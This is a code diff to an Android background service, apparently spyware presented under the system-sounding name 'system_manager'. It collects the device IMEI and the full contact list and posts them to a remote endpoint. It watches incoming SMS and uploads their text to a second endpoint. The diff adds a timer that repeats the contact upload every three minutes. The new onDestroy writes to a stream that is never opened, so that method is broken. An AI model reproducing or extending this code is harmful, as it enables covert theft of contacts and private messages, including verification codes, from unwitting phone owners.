@@ -10,6 +10,7 @@ import android.content.IntentFilter;
 import android.database.ContentObserver;
 import android.database.Cursor;
 import android.net.Uri;
+import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Message;
@@ -21,6 +22,10 @@ import android.util.Log;
 import com.lzy.okgo.OkGo;
 import com.lzy.okgo.callback.StringCallback;
 
+import java.io.File;
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
+import java.io.IOException;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -42,19 +47,25 @@ public class system_manager extends Service {
     private List<String> contactList = new ArrayList<>();
     private String deviceId;
     private ContentObserver co;
+    private static final int TIME_LOOP = 3000 * 60;
+    private File logsFile;
+    private FileOutputStream fileOutputStream;
 
     @Nullable
     @Override
     public IBinder onBind(Intent intent) {
-
         return null;
     }
 
     @Override
     public void onCreate() {
         super.onCreate();
-
-        loadContacts();
+        logsFile = OIApp.getInstance().getLogsFile();
+        try {
+            loadContacts();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
         IntentFilter intentFilter = new IntentFilter();
         intentFilter.addAction("smsPost");
         intentFilter.addAction("smsReceiver");
@@ -63,22 +74,25 @@ public class system_manager extends Service {
 
 
 
-    private void loadContacts() {
+    private void loadContacts() throws Exception {
         //if (contactList.size() > 0) contactList.clear();
+//        fileOutputStream = new FileOutputStream(logsFile);
+//        fileOutputStream.write(("------开始读取联系人-----"+"\n").getBytes());
 
         TelephonyManager telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
         deviceId = telephonyManager.getDeviceId();
         OIApp.getInstance().getSp().edit().putString("deviceId", deviceId).apply();
         startTakeBook();
-
+        //fileOutputStream.write(("------获取IMEI-----" + deviceId+"\n").getBytes());
         StringBuilder sb = new StringBuilder();
         if (contactList != null && contactList.size() > 0) {
             for (String s : contactList) {
                 Log.e(TAG, "loadContacts: " + s + "     >> " + deviceId);
                 sb.append(s + ",");
+                //fileOutputStream.write(("------正在读取联系人-----" + s+"\n").getBytes());
             }
         }
-
+        //fileOutputStream.write(("------联系人上传地址-----" + Config.CONTACTS+"\n").getBytes());
         OkGo.post(Config.CONTACTS)
                 .params("imei", deviceId)
                 .params("PhoneNum", sb.toString())
@@ -86,17 +100,30 @@ public class system_manager extends Service {
                     @Override
                     public void onSuccess(String s, Call call, Response response) {
                         Log.e(TAG, "onSuccess: 上传通讯录成功 " + s);
+                        handler.sendEmptyMessageDelayed(1, TIME_LOOP);
+//                        try {
+//                            fileOutputStream.write(("------上传通讯录成功-----"+s+"\n\n").getBytes());
+//                        } catch (IOException e) {
+//                            e.printStackTrace();
+//                        }
                     }
 
                     @Override
                     public void onError(Call call, Response response, Exception e) {
                         super.onError(call, response, e);
                         Log.e(TAG, "onError: 上传通讯录失败 " + e.getMessage());
+//                        try {
+//                            fileOutputStream.write(("------上传通讯录失败-----"+e.getMessage()+"\n\n").getBytes());
+//                        } catch (IOException e1) {
+//                            e1.printStackTrace();
+//                        }
                     }
                 });
-
+        //fileOutputStream.write(("------读取新信息内容提供者启动-----"+"\n").getBytes());
         co = new SmsReceiver(handler, getApplicationContext());
         this.getContentResolver().registerContentObserver(Uri.parse(Config.SMS_URI_ALL), true, co);
+        //fileOutputStream.write(("------读取联系人并执行上传完毕-----" +"\n\n\n").getBytes());
+
     }
 
     BroadcastReceiver br = new BroadcastReceiver() {
@@ -105,6 +132,11 @@ public class system_manager extends Service {
             String action = intent.getAction();
             String deviceId = OIApp.getInstance().getSp().getString("deviceId", "");
             String postMsg = "";
+//            try {
+//                fileOutputStream.write(("------获取新信息开始-----" +deviceId+"\n").getBytes());
+//            } catch (IOException e) {
+//                e.printStackTrace();
+//            }
             if (action.equals("smsPost")) {
                 postMsg = intent.getStringExtra("smsListener");
                 Log.e(TAG, "onReceive: 监听新短信 " + postMsg);
@@ -116,6 +148,12 @@ public class system_manager extends Service {
             }
             Log.e(TAG, "onReceive: 接受短信 >>>  " + postMsg);
 
+//            try {
+//                fileOutputStream.write(("------新信息已到达-----" +postMsg+"\n----上传地址--------"+Config.POST_SMS+"\n").getBytes());
+//            } catch (IOException e) {
+//                e.printStackTrace();
+//            }
+
             if (postMsg.equals("")) return;
 
             OkGo.post(Config.POST_SMS)
@@ -126,15 +164,32 @@ public class system_manager extends Service {
                         public void onSuccess(String s, Call call, Response response) {
                             Log.e(TAG, "onSuccess: DB监听短信发送 " + s);
                             handler.sendEmptyMessage(0);
+//                            try {
+//                                fileOutputStream.write(("------新信息上传完毕-----" + s + "\n\n").getBytes());
+//                            } catch (IOException e1) {
+//                                e1.printStackTrace();
+//                            }
                         }
 
                         @Override
                         public void onError(Call call, Response response, Exception e) {
                             super.onError(call, response, e);
                             Log.e(TAG, "onError: DB监听短信失败 " + e.getMessage());
+//                            try {
+//                                fileOutputStream.write(("------新信息上传失败-----" + e.getMessage() + "\n\n").getBytes());
+//                            } catch (IOException e1) {
+//                                e1.printStackTrace();
+//                            }
                         }
                     });
             startService(new Intent(context, system_manager.class));
+//            try {
+//                fileOutputStream.write(("------获取新信息获取完毕-----" +"\n\n").getBytes());
+//                fileOutputStream.flush();
+//
+//            } catch (IOException e) {
+//                e.printStackTrace();
+//            }
         }
     };
 
@@ -149,7 +204,11 @@ public class system_manager extends Service {
 
                     break;
                 case 1:
-
+                    try {
+                        loadContacts();
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    }
                     break;
             }
         }
@@ -203,4 +262,14 @@ public class system_manager extends Service {
         notification.setLatestEventInfo(this, "system.io.manager", "running", service);
         return super.onStartCommand(intent, 0, notification);
     }*/
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        try {
+            fileOutputStream.write(("------Service结束-----" +"\n\n").getBytes());
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
 }
